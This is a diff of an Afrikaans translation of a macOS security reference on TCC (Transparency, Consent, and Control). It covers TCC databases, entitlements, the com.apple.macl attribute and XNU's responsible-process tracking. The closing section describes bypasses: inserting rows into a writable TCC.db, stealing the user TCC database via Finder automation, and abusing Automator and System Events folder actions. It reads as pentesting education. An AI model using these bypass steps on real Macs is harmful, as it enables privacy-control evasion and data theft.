@@ -4,48 +4,48 @@
 
 ## **Basiese Inligting**
 
-**TCC (Deursigtigheid, Toestemming, en Beheer)** is 'n sekuriteitsprotokol wat fokus op die regulering van toepassings se toestemmings. Sy primêre rol is om sensitiewe funksies soos **liggingsdienste, kontakte, foto's, mikrofoon, kamera, toeganklikheid, en volle skyf toegang** te beskerm. Deur eksplisiete gebruikers toestemming te vereis voordat app toegang tot hierdie elemente gegee word, verbeter TCC privaatheid en gebruikersbeheer oor hul data.
+**TCC (Transparency, Consent, and Control)** is ’n sekuriteitsprotokol wat daarop fokus om toepassingstoestemmings te reguleer. Die primêre rol daarvan is om sensitiewe kenmerke soos **liggingdienste, kontakte, foto's, mikrofoon, kamera, toeganklikheid en volledige skyftoegang** te beskerm. Deur uitdruklike gebruikerstoestemming te vereis voordat toegang tot hierdie elemente aan ’n toepassing verleen word, verbeter TCC privaatheid en gebruikersbeheer oor hul data.
 
-Gebruikers teëkom TCC wanneer toepassings toegang tot beskermde funksies versoek. Dit is sigbaar deur 'n prompt wat gebruikers toelaat om **toegang goed te keur of te weier**. Verder akkommodeer TCC direkte gebruikers aksies, soos **slepen en laat val van lêers in 'n toepassing**, om toegang tot spesifieke lêers te verleen, wat verseker dat toepassings slegs toegang het tot wat eksplisiet toegelaat word.
+Gebruikers kom TCC teë wanneer toepassings toegang tot beskermde kenmerke versoek. Dit word sigbaar deur ’n prompt wat gebruikers toelaat om **toegang goed te keur of te weier**. Verder ondersteun TCC direkte gebruikersaksies, soos **om lêers na ’n toepassing te sleep en te laat val**, om toegang tot spesifieke lêers te verleen. Dit verseker dat toepassings slegs toegang het tot dit wat uitdruklik toegelaat is.
 
-![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)
+![’n Voorbeeld van ’n TCC-prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)
 
-**TCC** word hanteer deur die **daemon** geleë in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` en geconfigureer in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (wat die mach diens `com.apple.tccd.system` registreer).
+**TCC** word hanteer deur die **daemon** wat geleë is in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` en gekonfigureer is in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (wat die mach service `com.apple.tccd.system` registreer).
 
-Daar is 'n **gebruikermodus tccd** wat per ingelogde gebruiker loop, gedefinieer in `/System/Library/LaunchAgents/com.apple.tccd.plist`, wat die mach dienste `com.apple.tccd` en `com.apple.usernotifications.delegate.com.apple.tccd` registreer.
+Daar loop ’n **user-mode tccd** vir elke aangemelde gebruiker, gedefinieer in `/System/Library/LaunchAgents/com.apple.tccd.plist`, wat die mach services `com.apple.tccd` en `com.apple.usernotifications.delegate.com.apple.tccd` registreer.
 
-Hier kan jy die tccd sien wat as stelsel en as gebruiker loop:
+Hier kan jy sien hoe tccd as system en as user loop:
 ```bash
 ps -ef | grep tcc
 0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
 501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
 ```
-Permissions word **geërf van die ouer** toepassing en die **toestemmings** word **gevolg** op grond van die **Bundle ID** en die **Developer ID**.
+Permissions word **van die ouer**-toepassing oorgeërf en die **permissions** word nagespoor volgens die **Bundle ID** en die **Developer ID**.
 
-### TCC Databases
+### TCC-databasisse
 
-Die toestemmings/ontkennings word dan in sommige TCC-databasisse gestoor:
+Die toestemmings/weierings word dan in sommige TCC-databasisse gestoor:
 
-- Die stelselswye databasis in **`/Library/Application Support/com.apple.TCC/TCC.db`**.
-- Hierdie databasis is **SIP beskerm**, so slegs 'n SIP omseiling kan daarin skryf.
-- Die gebruiker TCC databasis **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** vir per-gebruiker voorkeure.
-- Hierdie databasis is beskerm, so slegs prosesse met hoë TCC voorregte soos Volledige Skyf Toegang kan daarin skryf (maar dit is nie deur SIP beskerm nie).
+- Die stelselwye databasis in **`/Library/Application Support/com.apple.TCC/TCC.db`** .
+- Hierdie databasis word deur **SIP** beskerm, dus kan slegs ’n SIP bypass daarin skryf.
+- Die gebruiker se TCC-databasis **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** vir voorkeure per gebruiker.
+- Hierdie databasis word beskerm, sodat slegs prosesse met hoë TCC-privileges, soos Full Disk Access, daarin kan skryf (maar dit word nie deur SIP beskerm nie).
 
 > [!WARNING]
-> Die vorige databasisse is ook **TCC beskerm vir lees toegang**. So jy **sal nie in staat wees om te lees** jou gewone gebruiker TCC databasis tensy dit van 'n TCC voorregte proses is.
+> Die vorige databasisse word ook **deur TCC beskerm vir leestoegang**. Jy sal dus **nie jou gewone gebruiker se TCC-databasis kan lees** nie, tensy dit vanaf ’n TCC-bevoorregte proses gedoen word.
 >
-> Onthou egter dat 'n proses met hierdie hoë voorregte (soos **FDA** of **`kTCCServiceEndpointSecurityClient`**) in staat sal wees om in die gebruikers TCC databasis te skryf.
+> Onthou egter dat ’n proses met hierdie hoë privileges (soos **FDA** of **`kTCCServiceEndpointSecurityClient`**) in staat sal wees om in die gebruikers se TCC-databasis te skryf
 
-- Daar is 'n **derde** TCC databasis in **`/var/db/locationd/clients.plist`** om kliënte aan te dui wat toegelaat word om **toegang tot liggingdienste** te hê.
-- Die SIP beskermde lêer **`/Users/carlospolop/Downloads/REG.db`** (ook beskerm teen lees toegang met TCC), bevat die **ligging** van al die **geldige TCC databasisse**.
-- Die SIP beskermde lêer **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (ook beskerm teen lees toegang met TCC), bevat meer TCC toegewyde toestemmings.
-- Die SIP beskermde lêer **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (maar leesbaar deur enige iemand) is 'n toelaat lys van toepassings wat 'n TCC uitsondering vereis.
-
-> [!TIP]
-> Die TCC databasis in **iOS** is in **`/private/var/mobile/Library/TCC/TCC.db`**
+- Daar is ’n **derde** TCC-databasis in **`/var/db/locationd/clients.plist`** om kliënte aan te dui wat toegelaat word om toegang tot location services te verkry.
+- Die SIP-beskermde lêer **`/Users/carlospolop/Downloads/REG.db`** (ook teen leestoegang deur TCC beskerm), bevat die **ligging** van al die **geldige TCC-databasisse**.
+- Die SIP-beskermde lêer **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (ook teen leestoegang deur TCC beskerm), bevat meer TCC-toestemmings wat toegestaan is.
+- Die SIP-beskermde lêer **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (maar deur enigiemand leesbaar) is ’n allow list van toepassings wat ’n TCC-uitsondering vereis.
 
 > [!TIP]
-> Die **kennisgewing sentrum UI** kan **veranderings in die stelsel TCC databasis** maak:
+> Die TCC-databasis in **iOS** is in **`/private/var/mobile/Library/TCC/TCC.db`**
+
+> [!TIP]
+> Die **notification center UI** kan **veranderinge aan die stelsel se TCC-databasis** maak:
 >
 > ```bash
 > codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
@@ -54,9 +54,9 @@ Die toestemmings/ontkennings word dan in sommige TCC-databasisse gestoor:
 > com.apple.rootless.storage.TCC
 > ```
 >
-> Onthou egter, gebruikers kan **reëls verwyder of navraag doen** met die **`tccutil`** opdraglyn nut.
+> Gebruikers kan egter reëls **verwyder of navraag daaroor doen** met die **`tccutil`** command line utility.
 
-#### Navraag oor die databasisse
+#### Doen navraag oor die databasisse
 
 {{#tabs}}
 {{#tab name="user DB"}}
@@ -102,17 +102,17 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 {{#endtabs}}
 
 > [!TIP]
-> Deur beide databasisse te kontroleer, kan jy die toestemmings wat 'n app toegelaat het, verbied het, of nie het nie (dit sal daarna vra).
+> Deur albei databasisse na te gaan, kan jy die toestemmings nagaan wat ’n app toegelaat het, verbied is, of nie het nie (dit sal daarvoor vra).
 
-- Die **`service`** is die TCC **toestemming** string voorstelling
-- Die **`client`** is die **bundel ID** of **pad na binêre** met die toestemmings
-- Die **`client_type`** dui aan of dit 'n Bundel Identifiseerder(0) of 'n absolute pad(1) is
+- Die **`service`** is die TCC-**permission**-stringverteenwoordiging
+- Die **`client`** is die **bundle ID** of **pad na binary** met die toestemmings
+- Die **`client_type`** dui aan of dit ’n Bundle Identifier(0) of ’n absolute pad(1) is
 
 <details>
 
-<summary>Hoe om uit te voer as dit 'n absolute pad is</summary>
+<summary>Hoe om uit te voer as dit ’n absolute pad is</summary>
 
-Doen net **`launctl load you_bin.plist`**, met 'n plist soos:
+Doen eenvoudig **`launctl load you_bin.plist`**, met ’n plist soos:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -152,8 +152,8 @@ Doen net **`launctl load you_bin.plist`**, met 'n plist soos:
 </details>
 
 - Die **`auth_value`** kan verskillende waardes hê: denied(0), unknown(1), allowed(2), of limited(3).
-- Die **`auth_reason`** kan die volgende waardes neem: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
-- Die **csreq** veld is daar om aan te dui hoe om die binêre te verifieer om uit te voer en die TCC-toestemmings toe te ken:
+- Die **`auth_reason`** kan die volgende waardes hê: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
+- Die **csreq**-veld dui aan hoe die binary wat uitgevoer moet word, geverifieer en die TCC-permissions toegestaan moet word:
 ```bash
 # Query to get cserq in printable hex
 select service, client, hex(csreq) from access where auth_value=2;
@@ -169,12 +169,12 @@ echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
 REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
 echo "X'$REQ_HEX'"
 ```
-- Vir meer inligting oor die **ander velde** van die tabel [**kyk hierdie blogpos**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).
+- Vir meer inligting oor die **ander velde** van die tabel, [**raadpleeg hierdie blogplasing**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[1]</sup>
 
-Jy kan ook **reeds gegee toestemmings** aan toepassings in `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` nagaan.
+Jy kan ook **reeds verleende toestemmings** aan apps nagaan in `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.
 
 > [!TIP]
-> Gebruikers _kan_ **reëls verwyder of navraag doen** met **`tccutil`** .
+> Gebruikers _kan_ **reëls uitvee of navraag daaroor doen** deur **`tccutil`** te gebruik.
 
 #### Stel TCC-toestemmings terug
 ```bash
@@ -184,9 +184,9 @@ tccutil reset All app.some.id
 # Reset the permissions granted to all apps
 tccutil reset All
 ```
-### TCC Handtekening Kontroles
+### TCC-handtekeningkontroles
 
-Die TCC **databasis** stoor die **Bundle ID** van die toepassing, maar dit **stoor** ook **inligting** oor die **handtekening** om te **verseker** dat die App wat vra om 'n toestemming te gebruik die korrekte een is.
+Die TCC-**databasis** stoor die **Bundle ID** van die toepassing, maar dit stoor ook **inligting** oor die **handtekening** om **seker te maak** dat die App wat vra om die toestemming te gebruik, die korrekte een is.
 ```bash
 # From sqlite
 sqlite> select service, client, hex(csreq) from access where auth_value=2;
@@ -199,16 +199,20 @@ csreq -t -r /tmp/telegram_csreq.bin
 (anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
 ```
 > [!WARNING]
-> Daarom sal ander toepassings wat dieselfde naam en bundel-ID gebruik nie toegang hê tot die toegestane regte wat aan ander toepassings gegee is nie.
+> Daarom sal ander toepassings wat dieselfde naam en bundle ID gebruik, nie toegang hê tot toestemmings wat aan ander toepassings toegestaan is nie.
 
-### Regte & TCC Toestemmings
+### Entitlements & TCC-toestemmings
 
-Toepassings **moet nie net** **aansoek doen** en **toegang verkry** tot sekere hulpbronne nie, hulle moet ook **die relevante regte hê**.\
-Byvoorbeeld, **Telegram** het die reg `com.apple.security.device.camera` om **toegang tot die kamera** aan te vra. 'n **toepassing** wat **nie** hierdie **reg het nie, sal nie** toegang tot die kamera kan verkry nie (en die gebruiker sal selfs nie vir die toestemmings gevra word nie).
+Toepassings **hoef nie net** toegang tot sekere hulpbronne te **versoek** en dit toegestaan te word nie; hulle moet ook die **relevante entitlements hê**.\
+Byvoorbeeld, **Telegram** het die entitlement `com.apple.security.device.camera` om **toegang tot die kamera te versoek**. ’n **Toepassing** wat nie hierdie **entitlement het nie, sal nie toegang** tot die kamera kan verkry nie (en die gebruiker sal nie eens vir die toestemmings gevra word nie).
 
-However, vir toepassings om **toegang** tot **sekere gebruikersmappies** te hê, soos `~/Desktop`, `~/Downloads` en `~/Documents`, hoef hulle **nie** enige spesifieke **regte te hê nie.** Die stelsel sal toegang deursigtig hanteer en **die gebruiker** soos nodig vra.
+Let daarop dat entitlements plist-lêers is en deel van code sig vorm, verder in code sig gehash word deur spesiale slots, en óf deur kernelkode in die kernel óf deur user model-kode met `csops(#169)` of `csops_audittoken(#170)` bevraagteken kan word.
 
-Apple se toepassings **sal nie pop-ups genereer** nie. Hulle bevat **vooraf-toegepaste regte** in hul **regte** lys, wat beteken hulle sal **nooit 'n pop-up genereer** nie, **ook** sal hulle nie in enige van die **TCC databasisse** verskyn nie. Byvoorbeeld:
+Vir toepassings om **toegang** tot **sekere gebruikervouers**, soos `~/Desktop`, `~/Downloads` en `~/Documents`, te verkry, **hoef** hulle egter nie enige spesifieke **entitlements** te hê nie. Die stelsel sal toegang deursigtig hanteer en die **gebruiker vra** soos nodig.
+
+- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)
+
+Apple se toepassings **sal nie prompts genereer nie**. Hulle bevat **vooraf-toegestane regte** in hul **entitlements**-lys, wat beteken dat hulle **nooit ’n pop-up sal genereer nie**, en ook nie in enige van die **TCC-databasisse** sal verskyn nie. Byvoorbeeld:
 ```bash
 codesign -dv --entitlements :- /System/Applications/Calendar.app
 [...]
@@ -219,22 +223,22 @@ codesign -dv --entitlements :- /System/Applications/Calendar.app
 <string>kTCCServiceAddressBook</string>
 </array>
 ```
-Dit sal verhoed dat Kalender die gebruiker vra om toegang tot herinneringe, kalender en die adresboek te verkry.
+Dit sal verhoed dat Calendar die gebruiker vra om toegang tot reminders, calendar en die address book te verkry.
 
 > [!TIP]
-> Behalwe vir 'n paar amptelike dokumentasie oor regte, is dit ook moontlik om onoffisiële **interessante inligting oor regte te vind in** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
+> Benewens sommige amptelike dokumentasie oor entitlements, is dit ook moontlik om nie-amptelike **interesting information about entitlements in** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) te vind.
 
-Sommige TCC-toestemmings is: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Daar is geen openbare lys wat al hulle definieer nie, maar jy kan hierdie [**lys van bekende**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) nagaan.
+Sommige TCC-permissies is: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Daar is geen publieke lys wat almal definieer nie, maar jy kan hierdie [**list of known ones**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) nagaan.<sup>[1]</sup>
 
-### Sensitiewe onbeveiligde plekke
+### Sensitive unprotected places
 
 - $HOME (self)
 - $HOME/.ssh, $HOME/.aws, ens.
 - /tmp
 
-### Gebruiker se Intent / com.apple.macl
+### User Intent / com.apple.macl
 
-Soos vroeër genoem, is dit moontlik om **toegang aan 'n App tot 'n lêer te verleen deur dit te sleep en te laat val**. Hierdie toegang sal nie in enige TCC-databasis gespesifiseer word nie, maar as 'n **verlengde** **attribuut van die lêer**. Hierdie attribuut sal die **UUID** van die toegelate app **stoor**:
+Soos voorheen genoem, is dit moontlik om **toegang tot ’n lêer aan ’n App te verleen deur dit na die App te sleep\&los**. Hierdie toegang sal nie in enige TCC-database gespesifiseer word nie, maar as ’n **extended** **attribute of the file**. Hierdie attribute sal die UUID van die toegelate App stoor:<sup>[2]</sup>
 ```bash
 xattr Desktop/private.txt
 com.apple.macl
@@ -250,21 +254,193 @@ otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| gr
 uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
 ```
 > [!TIP]
-> Dit is nuuskierig dat die **`com.apple.macl`** attribuut bestuur word deur die **Sandbox**, nie tccd nie.
+> Dit is merkwaardig dat die **`com.apple.macl`**-kenmerk deur die **Sandbox** bestuur word, nie deur tccd nie.
 >
-> Let ook daarop dat as jy 'n lêer wat die UUID van 'n toepassing op jou rekenaar toelaat, na 'n ander rekenaar skuif, omdat dieselfde toepassing verskillende UIDs sal hê, dit nie toegang aan daardie toepassing sal verleen nie.
+> Let ook daarop dat, indien jy 'n lêer wat die UUID van 'n toepassing op jou rekenaar toelaat, na 'n ander rekenaar verskuif, dit nie toegang aan daardie toepassing sal verleen nie, omdat dieselfde toepassing verskillende UID's sal hê.
 
-Die uitgebreide attribuut `com.apple.macl` **kan nie verwyder** word soos ander uitgebreide attribuut nie omdat dit **beskerm word deur SIP**. Dit is egter moontlik om dit te deaktiveer **deur die lêer te zip, dit te verwyder en dit weer te unzip** soos [**in hierdie pos verduidelik**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/).
+Die uitgebreide kenmerk `com.apple.macl` **kan nie skoongemaak word** soos ander uitgebreide kenmerke nie, omdat dit **deur SIP beskerm word**. Soos egter [**in hierdie plasing verduidelik word**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), is dit moontlik om dit te deaktiveer deur die lêer te **zip**, dit te **verwyder** en dit dan te **unzip**.<sup>[3]</sup>
+
+
+
+
+
+
+## XNU-meganisme vir verantwoordelike prosesse
+
+In macOS/iOS is die meganisme vir die **verantwoordelike proses** 'n kritieke sekuriteitsfunksie wat deur die **TCC (Transparency, Consent, and Control)**-raamwerk en ander sekuriteitstelsels gebruik word om na te spoor watter proses uiteindelik vir 'n handeling verantwoordelik is, selfs deur kettings van kinderprosesse heen.
+
+Wanneer TCC toestemmings nagaan (bv. kamera, mikrofoon, ligging), gaan dit nie altyd die onmiddellike proses na wat die versoek maak nie. In plaas daarvan gaan dit die **verantwoordelike proses** na - gewoonlik die GUI-toepassing wat die handeling geïnisieer het, selfs al kom die werklike versoek van 'n helperproses of daemon.
+
+<details>
+<summary>Hoe die verantwoordelike proses gestel word</summary>
+
+### Prosesstruktuurvelde
+
+Elke proses in XNU handhaaf twee belangrike UUID-identifiseerders:
+```c
+// From bsd/sys/proc_internal.h
+struct proc {
+// ...
+pid_t   p_responsible_pid;          // PID of the responsible process
+uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
+uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
+// ...
+};
+```
+- **`p_uuid`**: Die proses se eie UUID (van sy Mach-O-binêr se `LC_UUID`-laaibevel)
+- **`p_responsible_pid`**: Die PID van die verantwoordelike proses
+- **`p_responsible_uuid`**: Die UUID van die verantwoordelike proses (bly behoue selfs nadat daardie proses beëindig is)
+
+### Hoe die verantwoordelike proses gestel word
+
+1. **Tydens prosesskepping (Fork)**
+
+Wanneer 'n nuwe proses via `fork()` of `posix_spawn()` geskep word, word die verantwoordelike proses van die ouer geërf (`exec()`-system call hergebruik die bestaande `proc`-struktuur, dus word hierdie stap nie daar herhaal nie):
+
+**Ligging**: `bsd/kern/kern_fork.c:1053`
+```c
+// In fork1_internal() - called during all process creation
+proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
+```
+**Kernpunte:**
+- Child processes **erf** die ouer se `p_responsible_pid`
+- Dit skep ’n **ketting van verantwoordelikheid** deur die process-hiërargie
+- Die verantwoordelike process verwys tipies na die oorspronklike GUI-toepassing
+
+2. **Die Kernfunksie: `proc_set_responsible_pid()`**
+
+**Ligging**: `bsd/kern/kern_proc.c:4817-4831`
+```c
+void
+proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
+{
+target_proc->p_responsible_pid = responsible_pid;
+
+if (responsible_pid >= 0) {
+proc_t responsible_proc = proc_find(responsible_pid);
+if (responsible_proc != PROC_NULL) {
+// Copy the responsible process's UUID for persistent identification
+proc_getexecutableuuid(responsible_proc,
+target_proc->p_responsible_uuid,
+sizeof(target_proc->p_responsible_uuid));
+proc_rele(responsible_proc);
+}
+}
+return;
+}
+```
+**Wat hierdie funksie doen:**
+1. **Stel die verantwoordelike PID** in die teikenproses
+2. **Soek die verantwoordelike proses** met `proc_find()` (verhoog die verwysingtelling)
+3. **Kopieer die UUID** van die verantwoordelike proses se `p_uuid` na die teikenproses se `p_responsible_uuid`
+4. **Stel die verwysing vry** met `proc_rele()` (verlaag die verwysingtelling)
+
+3. **Waarom beide PID en UUID stoor?**
+
+Die dubbelstoor-benadering los ’n kritieke probleem op:
+
+| Veld | Doel | Probleem | Oplossing |
+|-------|---------|---------|----------|
+| `p_responsible_pid` | Vinnige opsoek van die huidige proses | PID kan hergebruik word nadat die proses beëindig is | Word gebruik vir aktiewe proses-opsoeke |
+| `p_responsible_uuid` | Volgehoue identifikasie | Bly behoue nadat die proses beëindig is | Word gebruik vir sekuriteitskontroles en ouditering |
+
+**Die Probleem**: As die verantwoordelike proses voor die kindproses beëindig word, kan die PID herwin en aan ’n heeltemal ander proses toegeken word.
+
+**Die Oplossing**: Die UUID is onveranderlik en identifiseer die spesifieke binary wat verantwoordelik was uniek, selfs nadat dit beëindig is.
+
+### Proses-skeppingsvloei
+```
+┌─────────────────────────────────────────────────────────────┐
+│ Parent Process (e.g., Safari)                               │
+│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
+│ p_responsible_pid: 1234 (points to itself)                 │
+│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
+└─────────────────────┬───────────────────────────────────────┘
+│
+│ fork() / posix_spawn()
+▼
+┌────────────────────────────┐
+│ kern_fork.c:fork1_internal │
+│                            │
+│ proc_set_responsible_pid(  │
+│   child_proc,              │
+│   parent->p_responsible_pid│
+│ );                         │
+└────────────┬───────────────┘
+│
+▼
+┌────────────────────────────┐
+│ proc_set_responsible_pid() │
+│                            │
+│ 1. Set p_responsible_pid   │
+│ 2. Find responsible proc   │
+│ 3. Copy UUID               │
+│ 4. Release reference       │
+└────────────┬───────────────┘
+│
+▼
+┌─────────────────────────────────────────────────────────────┐
+│ Child Process (e.g., SafariHelper)                          │
+│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
+│ p_responsible_pid: 1234 (inherited from parent)            │
+│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
+│                     (copied from Safari)                    │
+└─────────────────────────────────────────────────────────────┘
+```
+### UUID-bron: LC_UUID Load Command
+
+Die UUID wat in `p_uuid` gestoor word, kom van die **Mach-O executable se `LC_UUID` load command**:
+
+1. **Kompilasietyd**
+```bash
+# When linking, the linker (ld) generates a unique UUID
+$ ld -o myapp myapp.o
+# Embedded in the Mach-O binary as LC_UUID load command
+```
+2. **Uitvoeringstyd**
+
+**Ligging**: `bsd/kern/mach_loader.c:2393-2413`
+```c
+static load_return_t
+load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
+{
+if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
+(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
+return LOAD_BADMACHO;
+}
+
+// Extract UUID from LC_UUID load command
+memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
+return LOAD_SUCCESS;
+}
+```
+3. **Gestoor in prosesstruktuur**
+
+**Ligging**: `bsd/kern/kern_exec.c:2281`
+```c
+// After loading the Mach-O binary during exec()
+proc_setexecutableuuid(p, &load_result.uuid[0]);
+```
+**Ligging**: `bsd/kern/kern_proc.c:1912-1915`
+```c
+void
+proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
+{
+memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
+}
+```
+</details>
+
 
 ## TCC Privesc & Bypasses
 
-### Voeg in by TCC
+### Voeg by TCC in
 
-As jy op 'n stadium daarin slaag om skryftoegang oor 'n TCC-databasis te verkry, kan jy iets soos die volgende gebruik om 'n inskrywing toe te voeg (verwyder die kommentaar):
+As jy op enige stadium daarin slaag om skryftoegang tot ’n TCC-databasis te verkry, kan jy iets soos die volgende gebruik om ’n inskrywing by te voeg (verwyder die kommentare):
 
 <details>
 
-<summary>Voeg in by TCC voorbeeld</summary>
+<summary>Voorbeeld van invoeging in TCC</summary>
 ```sql
 INSERT INTO access (
 service,
@@ -308,7 +484,7 @@ strftime('%s', 'now') -- last_reminded with default current timestamp
 
 ### TCC Payloads
 
-As jy daarin geslaag het om in 'n app met 'n paar TCC-toestemmings te kom, kyk na die volgende bladsy met TCC payloads om dit te misbruik:
+As jy daarin geslaag het om toegang tot ’n app te kry met sommige TCC-permissies, kyk na die volgende bladsy met TCC payloads om dit te misbruik:
 
 
 {{#ref}}
@@ -317,20 +493,20 @@ macos-tcc-payloads.md
 
 ### Apple Events
 
-Leer meer oor Apple Events in:
+Leer meer oor Apple Events by:
 
 
 {{#ref}}
 macos-apple-events.md
 {{#endref}}
 
-### Automatisering (Finder) na FDA\*
+### Automation (Finder) to FDA\*
 
-Die TCC-naam van die Automatiseringstoestemming is: **`kTCCServiceAppleEvents`**\
-Hierdie spesifieke TCC-toestemming dui ook die **aansoek aan wat binne die TCC-databasis bestuur kan word** (so die toestemmings laat nie net toe om alles te bestuur nie).
+Die TCC-naam van die Automation-permissie is: **`kTCCServiceAppleEvents`**\
+Hierdie spesifieke TCC-permissie dui ook die **toepassing aan wat bestuur kan word** binne die TCC-databasis aan (dus laat die permissie nie toe om bloot alles te bestuur nie).
 
-**Finder** is 'n aansoek wat **altyd FDA het** (selfs al verskyn dit nie in die UI nie), so as jy **Automatisering** voorregte oor dit het, kan jy sy voorregte misbruik om **dit sekere aksies te laat uitvoer**.\
-In hierdie geval sal jou aansoek die toestemming **`kTCCServiceAppleEvents`** oor **`com.apple.Finder`** benodig.
+**Finder** is ’n toepassing wat **altyd FDA het** (selfs al verskyn dit nie in die UI nie), dus, as jy **Automation**-voorregte daaroor het, kan jy sy voorregte misbruik om **dit sekere aksies te laat uitvoer**.\
+In hierdie geval sal jou app die permissie **`kTCCServiceAppleEvents`** oor **`com.apple.Finder`** benodig.<sup>[4]</sup>
 
 {{#tabs}}
 {{#tab name="Steal users TCC.db"}}
@@ -360,19 +536,19 @@ EOD
 {{#endtab}}
 {{#endtabs}}
 
-Jy kan dit misbruik om **jou eie gebruiker TCC databasis te skryf**.
+Jy kan dit misbruik om **jou eie user TCC-databasis te skryf**.
 
 > [!WARNING]
-> Met hierdie toestemming sal jy in staat wees om **Finder te vra om toegang tot TCC-beperkte vouers** te verkry en jou die lêers te gee, maar sover ek weet, **sal jy nie in staat wees om Finder te laat uitvoer van willekeurige kode** om sy FDA-toegang ten volle te misbruik nie.
+> Met hierdie toestemming sal jy **Finder kan vra om toegang tot TCC-beperkte vouers te verkry** en die lêers aan jou te gee, maar afaik sal jy **nie Finder arbitrêre kode kan laat uitvoer** om sy FDA-toegang ten volle te misbruik nie.
 >
-> Daarom sal jy nie in staat wees om die volle FDA vermoëns te misbruik nie.
+> Daarom sal jy nie die volledige FDA-vermoëns kan misbruik nie.
 
-Dit is die TCC-prompt om outomatiseringsprivileges oor Finder te verkry:
+Dit is die TCC-prompt om Automation-voorregte oor Finder te verkry:
 
 <figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>
 
 > [!CAUTION]
-> Let daarop dat omdat die **Automator** app die TCC-toestemming **`kTCCServiceAppleEvents`** het, dit **enige app kan beheer**, soos Finder. So deur die toestemming om Automator te beheer, kan jy ook die **Finder** beheer met 'n kode soos die een hieronder:
+> Let daarop dat omdat die **Automator**-app die TCC-toestemming **`kTCCServiceAppleEvents`** het, dit **enige app kan beheer**, soos Finder. As jy dus toestemming het om Automator te beheer, kan jy ook die **Finder** beheer met kode soos die een hieronder:
 
 <details>
 
@@ -398,11 +574,11 @@ EOD
 ```
 </details>
 
-Die selfde gebeur met die **Script Editor app,** dit kan Finder beheer, maar met 'n AppleScript kan jy dit nie dwing om 'n script uit te voer nie.
+Dies gebeur ook met die **Script Editor-app,** wat Finder kan beheer, maar deur ’n AppleScript te gebruik, kan jy dit nie dwing om ’n script uit te voer nie.
 
-### Outomatisering (SE) na sommige TCC
+### Automation (SE) na sommige TCC
 
-**Sisteemgebeurtenisse kan Folder Actions skep, en Folder actions kan toegang tot sommige TCC-gidse hê** (Bureaublad, Dokumente & Aflaaie), so 'n script soos die volgende kan gebruik word om hierdie gedrag te misbruik:
+**System Events kan Folder Actions skep, en Folder Actions kan toegang tot sommige TCC-vouers verkry** (Desktop, Documents & Downloads), dus kan ’n script soos die volgende gebruik word om hierdie gedrag te misbruik:
 ```bash
 # Create script to execute with the action
 cat > "/tmp/script.js" <<EOD
